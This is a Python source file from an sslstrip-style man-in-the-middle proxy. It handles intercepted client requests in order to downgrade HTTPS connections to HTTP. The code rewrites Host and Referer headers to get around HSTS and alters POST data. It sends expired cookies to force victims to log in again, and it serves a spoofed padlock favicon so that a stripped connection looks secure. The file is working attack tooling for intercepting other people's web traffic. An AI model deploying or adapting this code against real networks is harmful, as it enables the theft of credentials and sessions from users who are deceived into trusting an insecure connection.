# Copyright (c) 2014-2016 Moxie Marlinspike, Marcello Salvati
#
# This program is free software; you can redistribute it and/or
# modify it under the terms of the GNU General Public License as
# published by the Free Software Foundation; either version 3 of the
# License, or (at your option) any later version.
#
# This program is distributed in the hope that it will be useful, but
# WITHOUT ANY WARRANTY; without even the implied warranty of
# MERCHANTABILITY or FITNESS FOR A PARTICULAR PURPOSE.  See the GNU
# General Public License for more details.
#
# You should have received a copy of the GNU General Public License
# along with this program; if not, write to the Free Software
# Foundation, Inc., 59 Temple Place, Suite 330, Boston, MA 02111-1307
# USA
#

import urlparse 
import logging 
import os 
import sys 
import random
import re 
import dns.resolver

from twisted.web.http import Request
from twisted.web.http import HTTPChannel
from twisted.web.http import HTTPClient

from twisted.internet import ssl
from twisted.internet import defer
from twisted.internet import reactor
from twisted.internet.protocol import ClientFactory

from ServerConnectionFactory import ServerConnectionFactory
from ServerConnection import ServerConnection
from SSLServerConnection import SSLServerConnection
from URLMonitor import URLMonitor
from CookieCleaner import CookieCleaner
from DnsCache import DnsCache
from core.logger import logger

formatter = logging.Formatter("%(asctime)s [ClientRequest] %(message)s", datefmt="%Y-%m-%d %H:%M:%S")
log = logger().setup_logger("ClientRequest", formatter)

class ClientRequest(Request):

    ''' This class represents incoming client requests and is essentially where
    the magic begins.  Here we remove the client headers we dont like, and then
    respond with either favicon spoofing, session denial, or proxy through HTTP
    or SSL to the server.
    '''

    def __init__(self, channel, queued, reactor=reactor):
        Request.__init__(self, channel, queued)
        self.reactor       = reactor
        self.urlMonitor    = URLMonitor.getInstance()
        self.hsts          = URLMonitor.getInstance().hsts
        self.cookieCleaner = CookieCleaner.getInstance()
        self.dnsCache      = DnsCache.getInstance()
        #self.uniqueId      = random.randint(0, 10000)
        
        #Use are own DNS server instead of reactor.resolve()
        self.customResolver = dns.resolver.Resolver()    
        self.customResolver.nameservers  = ['127.0.0.1']

    def cleanHeaders(self):
        headers = self.getAllHeaders().copy()

        if self.hsts:

            if 'referer' in headers:
                real = self.urlMonitor.real
                if len(real) > 0:
                    dregex = re.compile("({})".format("|".join(map(re.escape, real.keys()))))
                    headers['referer'] = dregex.sub(lambda x: str(real[x.string[x.start() :x.end()]]), headers['referer'])

            if 'host' in headers:
                host = self.urlMonitor.URLgetRealHost(str(headers['host']))
                log.debug("Modifing HOST header: {} -> {}".format(headers['host'], host))
                headers['host'] = host
                self.setHeader('Host', host)

        if 'accept-encoding' in headers:
             del headers['accept-encoding']
             log.debug("Zapped encoding")

        if self.urlMonitor.caching is False:

            if 'if-none-match' in headers:
                del headers['if-none-match']

            if 'if-modified-since' in headers:
                del headers['if-modified-since']

            headers['pragma'] = 'no-cache'

        return headers

    def getPathFromUri(self):
        if (self.uri.find("http://") == 0):
            index = self.uri.find('/', 7)
            return self.uri[index:]

        return self.uri        

    def getPathToLockIcon(self):
        if os.path.exists("lock.ico"): return "lock.ico"

        scriptPath = os.path.abspath(os.path.dirname(sys.argv[0]))
        scriptPath = os.path.join(scriptPath, "../share/sslstrip/lock.ico")

        if os.path.exists(scriptPath): return scriptPath

        log.warning("Error: Could not find lock.ico")
        return "lock.ico"        

    def handleHostResolvedSuccess(self, address):
        log.debug("Resolved host successfully: {} -> {}".format(self.getHeader('host'), address))
        host              = self.getHeader("host")
        headers           = self.cleanHeaders()
        client            = self.getClientIP()
        path              = self.getPathFromUri()
        url               = 'http://' + host + path
        self.uri          = url # set URI to absolute

        if self.content:
            self.content.seek(0,0)
        
        postData          = self.content.read()

        if self.hsts:

            host    = self.urlMonitor.URLgetRealHost(str(host))
            real    = self.urlMonitor.real
            patchDict = self.urlMonitor.patchDict
            url       = 'http://' + host + path
            self.uri  = url # set URI to absolute

            if real:
                dregex = re.compile("({})".format("|".join(map(re.escape, real.keys()))))
                path = dregex.sub(lambda x: str(real[x.string[x.start() :x.end()]]), path)
                postData = dregex.sub(lambda x: str(real[x.string[x.start() :x.end()]]), postData)
                
                if patchDict:
                    dregex = re.compile("({})".format("|".join(map(re.escape, patchDict.keys()))))
                    postData = dregex.sub(lambda x: str(patchDict[x.string[x.start() :x.end()]]), postData)

            
            headers['content-length'] = str(len(postData))

        #self.dnsCache.cacheResolution(host, address)
        hostparts = host.split(':')
        self.dnsCache.cacheResolution(hostparts[0], address)

        if (not self.cookieCleaner.isClean(self.method, client, host, headers)):
            log.debug("Sending expired cookies")
            self.sendExpiredCookies(host, path, self.cookieCleaner.getExpireHeaders(self.method, client, host, headers, path))
        
        elif (self.urlMonitor.isSecureFavicon(client, path)):
            log.debug("Sending spoofed favicon response")
            self.sendSpoofedFaviconResponse()

        elif self.urlMonitor.isSecureLink(client, url):
            log.debug("Sending request via SSL/TLS: {}".format(url))
            self.proxyViaSSL(address, self.method, path, postData, headers, self.urlMonitor.getSecurePort(client, url))
        
        else:
            log.debug("Sending request via HTTP")
            #self.proxyViaHTTP(address, self.method, path, postData, headers)
            port = 80
            if len(hostparts) > 1:
                port = int(hostparts[1])

            self.proxyViaHTTP(address, self.method, path, postData, headers, port)

    def handleHostResolvedError(self, error):
        log.debug("Host resolution error: {}".format(error))
        try:
            self.finish()
        except:
            pass

    def resolveHost(self, host):
        address = self.dnsCache.getCachedAddress(host)

        if address != None:
            log.debug("Host cached: {} {}".format(host, address))
            return defer.succeed(address)
        else:
            
            log.debug("Host not cached.")
            self.customResolver.port = self.urlMonitor.getResolverPort()

            try:
                log.debug("Resolving with DNSChef")
                address = str(self.customResolver.query(host)[0].address)
                return defer.succeed(address)
            except Exception:
                log.debug("Exception occured, falling back to Twisted")
                return reactor.resolve(host)

    def process(self):
        if self.getHeader('host') is not None:
            log.debug("Resolving host: {}".format(self.getHeader('host')))
            host = self.getHeader('host').split(":")[0]

            if self.hsts:
                host = self.urlMonitor.URLgetRealHost(str(host))                

            deferred = self.resolveHost(host)
            deferred.addCallback(self.handleHostResolvedSuccess)
            deferred.addErrback(self.handleHostResolvedError)

    def proxyViaHTTP(self, host, method, path, postData, headers, port):
        connectionFactory          = ServerConnectionFactory(method, path, postData, headers, self)
        connectionFactory.protocol = ServerConnection
        #self.reactor.connectTCP(host, 80, connectionFactory)
        self.reactor.connectTCP(host, port, connectionFactory)

    def proxyViaSSL(self, host, method, path, postData, headers, port):
        clientContextFactory       = ssl.ClientContextFactory()
        connectionFactory          = ServerConnectionFactory(method, path, postData, headers, self)
        connectionFactory.protocol = SSLServerConnection
        self.reactor.connectSSL(host, port, connectionFactory, clientContextFactory)

    def sendExpiredCookies(self, host, path, expireHeaders):
        self.setResponseCode(302, "Moved")
        self.setHeader("Connection", "close")
        self.setHeader("Location", "http://" + host + path)
        
        for header in expireHeaders:
            self.setHeader("Set-Cookie", header)

        self.finish()        
        
    def sendSpoofedFaviconResponse(self):
        icoFile = open(self.getPathToLockIcon())

        self.setResponseCode(200, "OK")
        self.setHeader("Content-type", "image/x-icon")
        self.write(icoFile.read())
                
        icoFile.close()
        self.finish()
